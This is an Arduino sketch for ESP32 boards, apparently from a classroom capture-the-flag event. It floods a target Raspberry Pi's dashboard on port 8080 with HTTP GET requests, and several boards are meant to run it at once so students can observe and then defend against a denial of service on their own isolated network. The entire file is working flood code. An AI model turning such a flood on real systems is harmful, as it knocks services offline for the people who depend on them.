// ctf_ddos_flood.ino
// Classroom DDoS demo: sends requests to the target Raspberry Pi's dashboard
// page as fast as this board can, on command. Meant to run on several ESP32
// boards at once so the class can see (and then defend against) a real,
// volume-based denial-of-service -- against infrastructure the class owns,
// on the isolated event Wi-Fi. See CLASSROOM-CTF-EVENT-en.md.

#include <WiFi.h>
#include <HTTPClient.h>

String targetSsid, targetPass, targetIP;
bool connected = false;
bool flooding = false;

unsigned long sent = 0, ok = 0, failed = 0;
unsigned long lastReport = 0;

void printStatus() {
  Serial.printf("  sent=%lu  ok=%lu  failed=%lu\n", sent, ok, failed);
}

void connectToWifi() {
  Serial.printf("\nConnecting to \"%s\" ...\n", targetSsid.c_str());
  WiFi.mode(WIFI_STA);
  WiFi.begin(targetSsid.c_str(), targetPass.c_str());

  unsigned long start = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - start < 20000) {
    delay(300);
    Serial.print(".");
  }

  if (WiFi.status() != WL_CONNECTED) {
    Serial.println("\nCouldn't connect -- check the network name/password and send it again.");
    return;
  }

  connected = true;
  Serial.printf("\nConnected. Target: %s\n", targetIP.c_str());
  Serial.println("Type 'start' to begin flooding the dashboard page, 'stop' to pause.");
  Serial.println("Watch the Pi's own screen -- that's where the effect shows up, not here.");
}

void handleCommand(const String& line) {
  if (line.equalsIgnoreCase("start")) {
    flooding = true;
    sent = ok = failed = 0;
    lastReport = millis();
    Serial.println("Flooding started.");
  } else if (line.equalsIgnoreCase("stop")) {
    flooding = false;
    Serial.println("Stopped.");
    printStatus();
  } else if (line.length() > 0) {
    Serial.println("Type 'start' or 'stop'.");
  }
}

void setup() {
  Serial.begin(115200);
  delay(300);
  Serial.println("\n=== CTF DDoS Flood (classroom demo) ===");
  Serial.println("Send: SSID,PASSWORD,TARGET_IP");
  Serial.println("(the flashing page's \"Send to Board\" form does this for you)");
}

void loop() {
  if (Serial.available()) {
    String line = Serial.readStringUntil('\n');
    line.trim();

    if (!connected) {
      int c1 = line.indexOf(',');
      int c2 = line.indexOf(',', c1 + 1);
      if (c1 > 0 && c2 > c1) {
        targetSsid = line.substring(0, c1);
        targetPass = line.substring(c1 + 1, c2);
        targetIP = line.substring(c2 + 1);
        targetIP.trim();
        connectToWifi();
      } else if (line.length() > 0) {
        Serial.println("Expected format: SSID,PASSWORD,TARGET_IP");
      }
    } else {
      handleCommand(line);
    }
  }

  if (connected && flooding) {
    HTTPClient http;
    http.begin("http://" + targetIP + ":8080/");
    http.setTimeout(500);
    int code = http.GET();
    sent++;
    if (code == 200) ok++; else failed++;
    http.end();

    if (millis() - lastReport > 1000) {
      lastReport = millis();
      printStatus();
    }
  }
}
